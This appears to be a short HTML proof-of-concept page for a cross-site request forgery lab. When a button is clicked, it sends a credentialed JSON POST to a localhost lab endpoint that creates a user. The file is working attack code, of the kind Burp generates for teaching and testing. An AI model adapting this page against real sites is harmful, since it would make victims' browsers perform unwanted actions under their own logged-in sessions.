<!--  
  XHR Request will not load Response, check network tab in browser or check response in Burp
-->
<html>
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/localhost:8000\/api\/create\/lab_4", true);
        xhr.setRequestHeader("Content-Type", "application\/json");
        // Talk about in which case this gives an error 
        xhr.withCredentials = true;
        var body = "{\r\n" + 
          "\t\"UserName\" : \"Aasim\",\r\n" + 
          "\t\"Role\" : \"Peasant\"\r\n" + 
          "}\r\n" + 
          "\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
